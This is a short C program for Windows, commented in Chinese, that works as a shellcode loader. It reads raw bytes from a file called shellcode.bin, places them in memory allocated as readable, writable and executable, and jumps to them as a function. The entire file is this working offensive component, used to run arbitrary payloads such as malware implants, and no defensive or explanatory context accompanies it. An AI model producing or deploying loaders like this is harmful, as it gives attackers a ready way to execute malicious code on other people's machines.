#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// 读取文件内容到内存中
char* read_binary_file(const char* filename, size_t* size) {
    FILE* file = fopen(filename, "rb");
    if (file == NULL) {
        perror("Failed to open file");
        exit(EXIT_FAILURE);
    }

    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    fseek(file, 0, SEEK_SET);

    char* buffer = (char*)malloc(*size);
    if (buffer == NULL) {
        perror("Failed to allocate memory");
        exit(EXIT_FAILURE);
    }

    fread(buffer, 1, *size, file);
    fclose(file);
    return buffer;
}

int main() {
    size_t size;
    char* shellcode = read_binary_file("shellcode.bin", &size);

    // 为 shellcode 分配可执行内存
    void* exec_mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        perror("Failed to allocate executable memory");
        free(shellcode);
        exit(EXIT_FAILURE);
    }

    // 复制 shellcode 到可执行内存
    memcpy(exec_mem, shellcode, size);

    // 释放 shellcode 文件内容
    free(shellcode);

    printf("[+] Shellcode address: %p\n", exec_mem);
    // 转换为函数指针并调用
    void (*func)() = (void (*)())exec_mem;
    func();

    // 释放可执行内存
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}
